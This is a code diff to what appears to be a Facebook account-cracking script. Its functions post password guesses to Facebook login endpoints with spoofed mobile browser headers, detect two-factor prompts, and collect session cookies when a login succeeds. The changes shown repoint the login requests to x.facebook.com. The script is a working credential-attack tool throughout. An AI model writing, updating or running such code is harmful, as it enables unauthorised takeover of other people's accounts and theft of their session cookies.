@@ -1035,7 +1035,7 @@ def freefb(uid, name, pwx, tl):
                 "login": "Log In",
             }
             headers ={
-            'authority': 'm.facebook.com',
+            'authority': 'x.facebook.com',
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
@@ -1054,7 +1054,7 @@ def freefb(uid, name, pwx, tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android zh-cn 8; Redmi X Build/2423.0.015) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4618.94 RealmeBrowser/35.5.0.812.18.3-gn',
             'x-asbd-id': '129477',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-            lo = Session.post("https://d.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
+            lo = Session.post("https://x.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
             log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
@@ -1270,7 +1270,7 @@ def mbasic(uid,pwx,tl):
             "pass":pw,
             "login":"Log In"}
             headers = {
-            'authority': 'web.facebook.com',
+            'authority': 'x.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
@@ -1290,7 +1290,7 @@ def mbasic(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = f"https://web.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = f"https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
